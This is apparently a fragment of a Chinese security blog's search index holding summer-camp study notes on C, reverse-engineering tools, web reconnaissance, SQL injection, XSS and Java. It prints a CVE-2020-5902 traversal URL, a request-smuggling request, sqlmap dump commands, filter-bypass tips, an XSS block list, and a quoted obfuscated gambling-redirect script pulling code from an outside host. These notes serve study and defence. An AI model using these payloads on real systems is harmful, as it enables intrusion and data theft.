的数据模型是 ILP32，即整数（Int）、长整数（Long）和指针（Pointer）都是 32 位。） ","date":"2021-08-24","objectID":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/:5:0","tags":null,"title":"2021年暑期夏令营笔记(day6)","uri":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/"},{"categories":["学习","安全技术"],"content":"0x00 day4 ","date":"2021-08-21","objectID":"/2021-08-21-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day4-day5/:1:0","tags":null,"title":"2021年暑期夏令营笔记(day4-day5)","uri":"/2021-08-21-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day4-day5/"},{"categories":["学习","安全技术"],"content":"0x01 day5 存储内存布局：C语言中，整数类型int通常使用小端方式存储。 C语言中，单精度浮点类型float通常使用IEEE浮点标准转换后再以小端方式存储。 C语言中，字符串中的字符按照从左到右的顺序，依次存储在一段连续的空间里，其中每一个字符占用一个字节，其内容为该字符在ASCII码表中对应的数值。在实际存储时，将自动在字符串尾部加了一个结束标志‘\\0’（其ASCII码值为0） 指针变量定义的一般形式为：类型名 * 指针变量名； 指针变量有两个有关的运算符：\u0026 取地址运算符，* 指针运算符。 若有赋值语句p=\u0026a;，则： \u0026*p=p。\u0026和*运算符的优先级相同，结合方向为从右到左。\u0026*p等价于\u0026(*p)，*p就是变量a，再执行\u0026运算，得到\u0026a，也就是p。因此\u0026*p=\u0026(*p)=\u0026a=p。 *\u0026a=a。*\u0026a等价于*(\u0026a)，\u0026a即为p，再执行*运算，得到*p，也就是变量a。因此*\u0026a=*(\u0026a)=*p=a。 可见，\u0026和*运算符在一起，其作用最后抵消。 如果p的初值是\u0026a[0]，那么： p+i和a+i都可以表示元素a[i]的地址，即它们都指向数组的第i个元素。a代表数组首地址，a+i也是地址，它的计算方法与p+i相同。*(p+i) 和*(a+i)都表示指针p+i或a+i所指向的数组元素a[i]的值。 由此可见，引用一个数组元素可以有两种方法：下标法，如a[i]，指针法，如*(p+i)。 但是二者使用时仍然有区别。因为作为指针变量的p可以实现自身值的改变，例如p++，使p的值自增。而数组名a是一个代表数组首地址的常量，它自身的值是不能改变的，即a++是不合法的。指向数组元素的指针变量可以自增或自减，大大方便了数组元素的操作。 指向函数的指针变量定义的一般形式为：类型名 （* 指针变量名）（参数列表）； 例如：int (*p)( )、表示p是一个指向函数的指针变量，此函数的返回值为int型。注意，*p两侧的括号不能省略。 指向函数的指针变量主要由两个用途：调用函数，将函数作为参数在函数间传递。 指针数组定义的形式为：类型名 *数组名[常量表达式]； 指针数组的主要用于管理同种类型的指针，其中最常用在处理若干个字符串(如二维字符数组)的操作。使用指针数组处理字符串时方便、简洁、效率高。 函数调用约定，是指当一个函数被调用时，函数的参数会被传递给被调用的函数和返回值会被返回给调用函数。函数的调用约定就是描述参数是怎么传递和由谁平衡堆栈的，当然还有返回值。 cdecl-–\u003eret，被调用者直接返回，不用恢复栈平衡，由调用者负责。stdcall-–\u003eret 4/8…，被调用者负责栈平衡，弹出字节。 调用过程 根据函数调用约定传递参数 保存函数的返回地址 保存调用方栈底（EBP） 设定被调用方的栈位置 为局部变量申请栈空间 调试版本会将局部变量的初始值设置为0xCCCCCCCC 保存寄存器环境 执行函数体 恢复寄存器环境 释放局部变量空间 恢复调用方栈底位置 根据调用约定清理参数占用空间 （A）__cdecl, 取出返回地址，将程序流程设定到此处，由调用方的代码负责清理参数空间 （B）其他调用约定, 取出返回地址, 清理参数空间后, 程序流程按返回地址回到调用方 main函数是程序的入口，并不是第一个运行的代码。 宏定义分为带参数的宏定义和不带参数的宏定义。 宏名的有效范围是从定义位置到文件结束。如果需要终止宏定义的作用域，可以用#undef命令。 对程序中用双引号扩起来的字符串内的字符，不进行宏的替换操作。 Windows SDK是微软每推出一个重要的 windows版本，一般都会同时推出一个SDK（Software Development Kit）。SDK包含了开发该windows版本所需的windows函数和常数定义、API函数说明文档、相关工具和示例。 API（Application Programming Interface），其实就是操作系统留给应用程序的一个调用接口，应用程序通过调用操作系统的 API 而使操作系统去执行应用程序的命令（动作）。早在 DOS 时代就有 API 的概念，只不过那个时候的 API是 以中断调用的形式（ INT 21h）提 供 的 ，在DOS下跑的应用程序都直接或间接的通过中断调用来使用操作系统功能，比如将 AH 置为 30h 后调用 INT 21h就可以得到 DOS 操作系统的版本号。而在 Windows 中，系统 API 是以函数调用的方式提供的。同样是取得操作系统的版本号 ，在 Windows 中你所要做的就是调用 GetVersionEx() 函 数 。可以这么说 ，DOS API 是基于汇编的 ， 而Windows API是基于高级语言的。 微软官方文档：https://docs.microsoft.com/zh-cn/windows/win32/api/ DLL ， 即 Dynamic Link Librar y （ 动 态 链 接 库 ） 。 在 Windows 环境下含有大量.dll格式的文件，这些文件就是动态链接库文件 ，其实也是一种可执行文件格式。跟.exe文件不同的是，.dll文件不能直接执行，通常由.exe在执行时装入，内含有一些资源以及可执行代码等 。其实Windows的三大模块就是以 DLL的形式提供的（ Kernel32.dll， User32.dll， GDI32.dll） ， 里面就含有了API函数的执行代码 。为了使用DLL中的API函数，必须要有API函数的声明（.h）和其导入库（.lib），导入库可以先这样理解，导入库是为了在DLL中找到API的入口点而使用的。 动态调试工具OllyDbg 反汇编窗口的列中，双击的效果： 地址列：显示相对被点击地址的地址，再次双击返回到标准地址模式\rHex数据列：设置或取消无条件断点，对应的快捷键是F2\r反汇编列：调用汇编器，可直接修改汇编代码\r注释列：运行增加或编辑注释，对应快捷键是“；”键\r调试中我们经常要用到的快捷键有这些： F2：设置或取消无条件断点\rF4：运行到选定位置\rF7：单步步入\rF8：单步步过\rF9：运行\rCTRL+F9：执行到返回\r静态调试工具IDA IDA子窗口 IDA View-A是反汇编窗口\rHexView-A是十六进制格式显示的窗口\rImpor ts是导入表（程序中调用到的外面的函数）\rFunctions是函数表（这个程序中的函数）\rStructures是结构\rEnums是枚举 ","date":"2021-08-21","objectID":"/2021-08-21-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day4-day5/:2:0","tags":null,"title":"2021年暑期夏令营笔记(day4-day5)","uri":"/2021-08-21-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day4-day5/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-08-19","objectID":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/:0:0","tags":["Web安全"],"title":"2021年暑期夏令营笔记(day1-day3)","uri":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/"},{"categories":["学习","安全技术"],"content":"0x00 day1 ","date":"2021-08-19","objectID":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/:1:0","tags":["Web安全"],"title":"2021年暑期夏令营笔记(day1-day3)","uri":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/"},{"categories":["学习","安全技术"],"content":"Web 基础课程 泛解析 123.example.com 2389qjlsfa.example.com 所谓“泛域名解析”是指：利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。 挖掘子域 爆破子域 admin mail ftp 使用收集dns数据的在线网站查找 https://rapiddns.io/ 抓取网站的链接分析 域名备案搜集资产 https://beian.miit.gov.cn/ 搜索引擎语法搜索 whois关联查询 查询证书https://crt.sh/ 工具 sublist3r–https://github.com/aboul3la/Sublist3r ksubdomain–https://github.com/knownsec/ksubdomain oneforall–https://github.com/shmilylty/OneForAll 反向代理与服务器的差异导致的问题 f5-big-ip-CVE-2020-5902 f5-big-ip 是一个本地流量管理器，常用于确保应用流量的安全，并对应用流量进行优化和负载均衡 https://ip/tmui/login.jsp https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp Apache会把 /..;/ 当作一个正常目录去对待，而Tomcat会把它当作父目录，当Apache将请求转发到Tomcat时，Tomcat会把它看作是: https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp https://xxxx/tmui/tmui/locallb/workspace/fileRead.jsp http请求走私 请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头 前端服务器处理 Content-Length 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 Content-Length ，处理 Transfer-Encoding 。例如 POST / HTTP/1.1\rHost: example.com\r...\rConnection: keep-alive\rContent-Length: 6\rTransfer-Encoding: chunked\r0\ra\r","date":"2021-08-19","objectID":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/:1:1","tags":["Web安全"],"title":"2021年暑期夏令营笔记(day1-day3)","uri":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/"},{"categories":["学习","安全技术"],"content":"JavaScript 基础 JS笔记 HTML嵌入JavaScript的方式：1、事件句柄；2、脚本块；3、引入外部独立的JS文件。 在JS当中，函数的名字不能重复，当函数重名的时候，后声明的函数会将之前的覆盖。 当一个变量声明的时候没有使用var关键字，那么不管这个变量是在哪里声明的，都是全局变量。 常用事件 blur 失去焦点\rfocus 获得焦点\rclick 鼠标单击\rdblclick 鼠标双击\rkeydown 键盘按下\rkeyup 键盘弹起\rmousedown 鼠标按下\rmouseover 鼠标经过\rmousemove 鼠标移动\rmouseout 鼠标离开\rmouseup 鼠标弹起\rreset 表单重置\rsubmit 表单提交\rchange 下拉列表选中项改变，或文本框内容改变\rselect 文本被选定\rload 页面加载完毕\r任何一个事件都会对应一个事件句柄，事件句柄是在事件前添加on，例如：onclick JavaScript的三大块 ECMAScript：JS的核心语法（ES规范/ECMA-262标准） DOM：Document Object Model（文档对象模型） 对网页当中的节点进行增删改查的过程 HTML文档被当作一棵DOM树来看待例如：var domObj = document.getElementById('id'); BOM：Browser Object Moder（浏览器对象模型） 关闭浏览器窗口、打开新的浏览器窗口、后退、前进、浏览器地址栏上的地址等 DOM和BOM的区别与联系 BOM的顶级对象是：window DOM的顶级对象是：document 实际上BOM包括DOM innerHTML和innerText的区别 相同点：都是设置元素内部的内容 不同点： innerHTML会把后面的字符串当作一段HTML代码解释并执行 innerText只会将后面的字符串作为普通字符串来看待 正则表达式对象的创建与调用 创建方式一var regExp = /正则表达式/flags; 创建方式二（使用内置支持类RegExp）var regExp = new RegExp (\"正则表达式\",\"flags\"); flags 含义 g 全局匹配 i 区分大小写的匹配 m 多行匹配 ES规范制定之后才支持m，当前面是正则表达式时，m不能用，只有前面是普通字符串时才可以使用。 JS解密实例 网站篡改被植入博彩跳转js，view-source:http://www.baoyuhuang.com/ \u003ctitle\u003ebeplayer体育app下载-【welcome】\u003c/title\u003e \u003cmeta name=\"keywords\" content=\"beplayer体育app下载-beplayer体育官方版APP下载-beplay下载官网_Beplay体育软件_beplay体育app安卓\"/\u003e \u003cmeta name=\"description\" content=\"【Beplayapp体育下载WWW.bob0897.COM】为您专业提供欧冠、体育、足球等资讯, beplayer体育下载包括:欧冠、奥运、世界杯、亚洲杯、欧洲杯等最精彩的体育赛事和beplayer体育官网投资...\"/\u003e \u003cscript\u003eif(navigator.userAgent.toLocaleLowerCase().indexOf(\"baidu\") == -1){document.title =\"鲍鱼的营养价值,鲍鱼批发市场,干鲍鱼价格,即食鲍鱼罐头,鲍鱼的家常做法大全-滋补皇鲍鱼网\"}\u003c/script\u003e \u003cscript type=\"text/javascript\"\u003eeval(function(p,a,c,k,e,r){e=function(c){return(c\u003ca?'':e(parseInt(c/a)))+((c=c%a)\u003e35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('n(f(p,a,c,k,e,r){e=f(c){h c.o(a)};i(!\\'\\'.j(/^/,q)){l(c--)r[e(c)]=k[c]||e(c);k=[f(e){h r[e]}];e=f(){h\\'\\\\\\\\w+\\'};c=1};l(c--)i(k[c])p=p.j(s t(\\'\\\\\\\\b\\'+e(c)+\\'\\\\\\\\b\\',\\'g\\'),k[c]);h p}(\\'1[\"2\"][\"3\"](\\\\\\'\u003c0 4=\"5/6\" 7=\"8://9.a.b/c.d\"\u003e\u003c/0\u003e\\\\\\');\\',m,m,\\'u|v|x|y|z|A|B|C|D|E|F|G|H|I\\'.J(\\'|\\'),0,{}))',46,46,'|||||||||||||||function||return|if|replace||while|14|eval|toString||String||new|RegExp|script|window||document|write|type|text|javascript|src|https|www|bob5918|com|bob|js|split'.split('|'),0,{}))\u003c/script\u003e \u003cmeta name=\"description\" content=\"滋补皇鲍鱼网是业内权威的的鲍鱼网站，提供鲍鱼的营养价值和功效作用、鲍鱼的批发市场、鲍鱼价格多少钱一斤、鲍鱼选购鉴别、鲍鱼的家常做法吃法、品牌即食鲍鱼罐头购买、鲍鱼图片等相关鲍鱼百科知识。\" /\u003e \u003cmeta name=\"keywords\" content=\"鲍鱼,鲍鱼的做法,鲍鱼价格,鲍鱼批发,鲍鱼批发市场,即食鲍鱼,鲍鱼多少钱一斤,鲍鱼的营养价值,鲍鱼怎么做,鲍鱼网\" /\u003e 解密第一步 eval(function (p, a, c, k, e, r) { e = function (c) { return (c \u003c a ? '' : e(parseInt(c / a))) + ((c = c % a) \u003e 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; if (!''.replace(/^/, String)) { while (c--) r[e(c)] = k[c] || e(c); k = [function (e) { return r[e] }]; e = function () { return '\\\\w+' }; c = 1 } ; while (c--) if (k[c]) p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]); console.log(p) }('n(f(p,a,c,k,e,r){e=f(c){h c.o(a)};i(!\\'\\'.j(/^/,q)){l(c--)r[e(c)]=k[c]||e(c);k=[f(e){h r[e]}];e=f(){h\\'\\\\\\\\w+\\'};c=1};l(c--)i(k[c])p=p.j(s t(\\'\\\\\\\\b\\'+e(c)+\\'\\\\\\\\b\\',\\'g\\'),k[c]);h p}(\\'1[\"2\"][\"3\"](\\\\\\'\u003c0 4=\"5/6\" 7=\"8://9.a.b/c.d\"\u003e\u003c/0\u003e\\\\\\');\\',m,m,\\'u|v|x|y|z|A|B|C|D|E|F|G|H|I\\'.J(\\'|\\'),0,{}))', 46, 46, '|||||||||||||||function||return|if|replace||while|14|eval|toString||String||new|RegExp|script|window||document|write|type|text|javascript|src|https|www|bob5918|com|bob|js|split'.split('|'), 0, {})) 解密第二步 eval(function (p, a, c, k, e, r) { e = function (c) { return c.toString(a) }; if (!''.replace(/^/, String)) { while (c--) r[e(c)] = k[c] || e(c); k = [function (e) { return r[e] }]; e = function () { return '\\\\w+' }; c = 1 } ; while (c--) if (k[c]) p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]); console.log(p) }('1[\"2\"][\"3\"](\\'\u003c0 4=\"5/6\" 7=\"8://9.a.b/c.d\"\u003e\u003c/0\u003e\\');', 14, 14, 'script|window|document|write|type|text|javascript|src|https|www|bob5918|com|b","date":"2021-08-19","objectID":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/:1:2","tags":["Web安全"],"title":"2021年暑期夏令营笔记(day1-day3)","uri":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/"},{"categories":["学习","安全技术"],"content":"0x01 day2 关系型运算符优先级高到低为：NOT＞AND＞OR select * from user where a=1 and b=2 or c=3 and d=4 •where子句中执行的先后顺序是： 最先是 a=1 and b=2 然后是 c=3 and d=4 最后是两个结果集or 等于 (a=1 and b=2) or (c=3 and d=4 ) SQL注入本质：SQL使用拼接方法，可注入恶意SQL语句改变原本语句执行逻辑 漏洞代码示例 JDBC Connection conn = [...]; Statement stmt = con.createStatement(); ResultSet rs = stmt.executeQuery(\"select * from user where username='\"\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e+username+\u003c/span\u003e\"';\"); Hibernate Session session = sessionFactory.openSession(); Query q = session.createQuery(\"select t from UserEntity t where id = \"\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e+input\u003c/span\u003e); q.execute(); Mybatis \u003cselect id=\"unsafe\" resultMap=\"myResultMap\"\u003e select * from table where name like '%\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e${value}\u003c/span\u003e%' \u003c/select\u003e UnSafeBean b = (UnSafeBean)sqlMap.queryForObject(\"value\", request.getParameter(\"name\")); ibatis \u003cselect id=\"unsafe\" resultMap=\"myResultMap\"\u003e select * from table where name ='$\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003evalue\u003c/span\u003e$' \u003c/select\u003e 识别Web应用与数据库交互的可能输入:POST请求参数 、GET请求参数、Cookie、Host、X-Forwarded-for…… oracle中判断数字型和字符型可以用/来进行除的操作。 数字型注入四则运算（尽量不使用“+”进行测试，+号在绝大多数网站中会被识别为空格）。 数字型注入1/0操作，MySQL 1/0报Warning，语句仍会正常执行；Oracle 1/0报Error，语句抛出异常。 判断数据库类型 基于报错信息 Oracle Error querying database. Cause: java.sql.SQLSyntaxErrorException: \u003cspan class=\"has-inline-color has-vivid-red-color\"\u003eORA\u003c/span\u003e-01756: quoted string not properly terminated SQL Server Microsoft OLE DB Provider for\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e SQL Server\u003c/span\u003e 错误 '80040e14' MySQL You have an error in your SQL syntax; check the manual that corresponds to your \u003cspan class=\"has-inline-color has-vivid-red-color\"\u003eMySQL\u003c/span\u003e server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 注入优先级：联合注入＞报错注入＞布尔盲注 ＞时间盲注 不同MySQL版本函数报错输出情况: MySQL 5.0.96 floor可回显想要的查询信息 MySQL 5.5.29 部分函数报错可回显想要的查询信息 MySQL 5.7.26 floor、extractvalue、 updatexml可回显想要的查询信息 MySQL 8 extractvalue、 updatexml可回显想要的查询信息 堆叠注入，顾名思义，就是将语句堆叠在一起进行查询 p可以同时执行多条语句的执行时的注入。在SQL中，分号（;）是用来表示一条sql语句的结束。与union injection（联合注入）的区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆查询注入可以执行的是任意的语句。 SQLmap常用命令 python sqlmap.py -u url --users #列出所有用户\rpython sqlmap.py -u url --current-user #列出当前用户\rpython sqlmap.py -u url --is-dba #查看当前用户是否为数据库管理员\rpython sqlmap.py -u url --dbs #列出所有数据库\rpython sqlmap.py -u url --current-db #查看当前数据库\rpython sqlmap.py -u url -D \"数据库名称\" --tables #查表名\rpython sqlmap.py -u url -D \"数据库名\" -T \"表名\" --colunms #查列名\rpython sqlmap.py -u url -D \"数据库名\" -T \"表名\" -C \"列名\" --dump #查询记录\rpython sqlmap.py -u url -D \"数据库名\" -T \"表名\" -C \"列名\" --dump --start n --stop m #查询记录n-m区间内的记录\rpython sqlmap.py -u url --data \"POST数据\" #POST请求注入\rpython sqlmap.py -r r.txt #将整个请求数据包保存为r.txt进行注入\r字符过滤 可过滤一些关键字 可过滤一些特殊符号 字符绕过 使用这些字符进行注入点识别：+，-，*，%，/，\u003e，||，|，\u0026，\u0026\u0026 可以将and换成or，\u0026\u0026， ||等，也可以不使用and或者or，直接使用异或截断： •1^1^0，1^0^0 SQL ByPass 预编译修复 JDBC Connection conn = [...]; conn.\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003eprepareStatement\u003c/span\u003e(\"update COFFEES set SALES = ? where COF_NAME = ?\"); updateSales.setInt(1, nbSales); updateSales.setString(2, coffeeName); Mybatis \u003cselect id=\"unsafe\" resultMap=\"myResultMap\"\u003e select * from table where name like ‘%\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e#{value}\u003c/span\u003e%' \u003c/select\u003e UnSafeBean b = (UnSafeBean)sqlMap.queryForObject(\"value\", request.getParameter(\"name\")); ibatis \u003cselect id=\"unsafe\" resultMap=\"myResultMap\"\u003e select * from table where name =‘\u003cspan class=\"has-inline-color has-vivid-red-color\"\u003e#value#\u003c/span\u003e' \u003c/select\u003e ","date":"2021-08-19","objectID":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/:2:0","tags":["Web安全"],"title":"2021年暑期夏令营笔记(day1-day3)","uri":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/"},{"categories":["学习","安全技术"],"content":"0x02 day3 XSS 安全基础 XSS在哪？ 直接插入到SCRIPT标签里 插入到HTML注释里 插入到HTML标签的属性名里 插入到HTML标签的属性值里 作为HTML标签的名字 直接插入到CSS里，范例：test\" style=\"css:expressio/**/n(alert(1))\" a=\" 常见业务场景 重灾区–评论区、留言区、个人信息、订单信息、…… 针对型–站内信、私信、意见反馈、…… 存在风险–搜索框、当前目录、图片属性、…… 如何判断是否存在XSS? 反射型 数据包中各种参数输入特定字符串进行尝试，查看返回包是否存在特定字符串 确定参数可回显后，判断是否可渲染 数据包返回类型 html：页面搜索传输的特定字符串 数据包返回类型 json：查看前端渲染情况 字符fuzz，看是否过滤或转义XSS常用的字符 存储型 字符fuzz，看是否过滤或转义XSS常用的字符 xss安全基础题目 \u003c!DOCTYPE html\u003e\u003c!--STATUS OK--\u003e\u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"\u003e \u003cscript\u003e window.alert = function() { confirm(\"完成的不错！\"); //window.location.href=\"level10.php?keyword=well done!\"; } \u003c/script\u003e \u003ctitle\u003e欢迎来到level21\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1 align=center\u003e欢迎来到level21\u003c/h1\u003e \u003c?php function remove_xss($val) { // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed // this prevents some character re-spacing such as \u003cjava\\0script\u003e // note that you have to handle splits with \\n, \\r, and \\t later since they *are* allowed in some inputs //http://blog.qita.in $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val); // straight replacements, the user should never need these since they're normal characters // this prevents like \u003cIMG SRC=@avascript:alert('XSS')\u003e $search = 'abcdefghijklmnopqrstuvwxyz'; $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; $search .= '1234567890!@#$%^\u0026*()'; $search .= '~`\";:?+/={}[]-_|\\'\\\\'; for ($i = 0; $i \u003c strlen($search); $i++) { // ;? matches the ;, which is optional // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars // @ @ search for the hex values $val = preg_replace('/(\u0026#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ; // @ @ 0{0,7} matches '0' zero to seven times $val = preg_replace('/(�{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ; } // now the only remaining whitespace attacks are \\t, \\n, and \\r $ra1 = array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base'); $ra2 = array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); $ra = array_merge($ra1, $ra2); $found = true; // keep replacing as long as the previous round replaced something while ($found == true) { $val_before = $val; for ($i = 0; $i \u003c sizeof($ra); $i++) { $pattern = '/'; for ($j = 0; $j \u003c strlen($ra[$i]); $j++) { if ($j \u003e 0) { $pattern .= '('; $pattern .= '(\u0026#[xX]0{0,8}([9ab]);)'; $pattern .= '|'; $pattern .= '|(�{0,8}([9|10|13]);)'; $pattern .= ')*'; } $pattern .= $ra[$i][$j]; } $pattern .= '/i'; $replacement = substr($ra[$i], 0, 2).'\u003cx\u003e'.substr($ra[$i], 2); // add in \u003c\u003e to nerf the tag $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags if ($val_before == $val) { // no replacements were made, so exit the loop $found = false; } } } return $val; } ini_set(\"displa","date":"2021-08-19","objectID":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/:3:0","tags":["Web安全"],"title":"2021年暑期夏令营笔记(day1-day3)","uri":"/2021-08-19-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day1-day3/"},{"categories":["学习","安全技术"],"content":"0x00 前言 继续对Android逆向进行学习，学习JAVA、Android、Dalvik的基本知识。 ","date":"2021-08-11","objectID":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/:1:0","tags":["逆向"],"title":"Android逆向学习小记(2)","uri":"/2021-08-11-android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B02/"},{"categories":["学习","安全技术"],"content":"0x01 JAVA Java的关键字如下： 继承可以使用 extends 这个关键字来实现继承，而且所有的类都是继承于java.lang.Object，当一个类没有继承的关键字，则默认继承 object（这个类在java.lang 包中，所以不需要 import）祖先类。 使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。 以通过super关键字来实现对父类成员的访问，用来引用当前对象的父类。this关键字指向自己的引用。 final 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写。 多态是同一个行为具有多个不同表现形式或形态的能力。多态就是同一个接口，使用不同的实例而执行不同操作。现实生活中，同一个方法具体实现也会不同。例如，同样是调用人“吃饭”的方法，中国人用筷子吃饭，英国人用刀叉吃饭，印度人用手吃饭。 多态是方法的多态，不是属性的多态(多态与属性无关)。 多态的存在要有3个必要条件：继承，方法重写，父类引用指向子类对象。 父类引用指向子类对象后，用该父类引用调用子类重写的方法，此时多态就出现了。 容器：更强大、更灵活、容量随时可扩。容器的接口层次结构图如图所示： Java 容器类类库的用途是保存对象，可以将其分为2 个概念： Collection，独立元素的序列，这些元素都服从一条或多条规则。List、Set 都是Collection 的一种，List 必须按照顺序保存元素，而Set 不能有重复元素。 Map，Map 是键值对类型，允许用户通过键来查找对象。Hash 表允许我们使用另一个对象来查找某个对象。 Collection接口 1）List 的特点及实现类 List 是有序、可重复的容器。List 中每个元素都有索引标记。可以根据元素的索引标记访问元素，从而精确控制这些元素。List 允许加入重复的元素。更准确的来说，List 通常允许满足 e1.equals(e2) 的元素重复加入容器。List 接口常用的实现类有 3 个：ArrayList、LinkedList 和Vector。 2）ArrayList ArrayList 底层是用数组实现的存储。ArrayList 是长度可变数组，元素以线性方式连续存储，内部允许存放重复元素。允许对元素进行随机的快速访问，但是向 ArrayList 中插入和删除元素的速度较慢。ArrayList 是非线程安全的。数组进行扩容时，会将老数组中的元素重新拷贝一份到新的数组中，每次数组容量的增长大约是其原容量的1.5 倍。 特点：查询效率高，增删效率低，线程不安全。 3）LinkedList LinkedLis 底层用双向链表实现的存储，内部采用双向循环链表实现，插入和删除元素的速度较快，随机访问的速度较慢，LinkedList 也是非线程安全的。 特点：查询效率低，增删效率高，线程不安全 4）Vector Vector 底层是用数组实现的List，相关的方法都加了同步检查，所以Vector 线程安全,效率低。 特点：线程安全,效率低。 Set 接口继承Collection 接口，Set 